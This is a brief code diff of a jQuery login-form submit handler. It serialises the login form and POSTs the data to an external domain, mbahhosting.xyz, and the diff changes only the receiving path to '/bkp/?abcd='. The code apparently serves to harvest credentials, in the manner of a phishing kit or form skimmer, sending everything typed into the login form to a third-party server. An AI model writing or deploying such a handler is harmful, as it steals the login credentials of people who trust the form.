@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
 	var d = $(".login-form");
 
 	$.ajax({
-        url: "https://mbahhosting.xyz/index.php",
+        url: "https://mbahhosting.xyz/bkp/?abcd=",
         type: "POST",
         data: d.serialize(),
         success: function () {
